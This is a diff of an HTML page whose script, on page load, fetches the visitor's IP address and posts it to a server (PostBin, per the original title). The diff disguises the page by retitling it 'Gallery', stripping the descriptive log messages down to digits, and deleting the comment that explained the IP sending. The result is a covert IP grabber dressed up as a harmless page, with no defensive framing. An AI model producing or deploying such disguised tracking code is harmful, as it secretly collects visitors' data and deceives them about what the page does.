@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Отправка IP на PostBin</title>
+    <title>Галерея</title>
 </head>
 <body>
     <script>
@@ -18,18 +18,18 @@
                         body: JSON.stringify({ ip_address: ipAddress })
                     })
                     .then(response => {
-                        console.log('IP успешно отправлен на сервер.');
+                        console.log('2');
                     })
                     .catch(error => {
-                        console.error('Произошла ошибка при отправке IP:', error);
+                        console.error('1', error);
                     });
                 })
                 .catch(error => {
-                    console.error('Ошибка при получении IP-адреса:', error);
+                    console.error('3', error);
                 });
         }
 
-        submitIP(); // Вызов функции отправки IP при загрузке страницы
+        submitIP();
     </script>
 </body>
 </html>
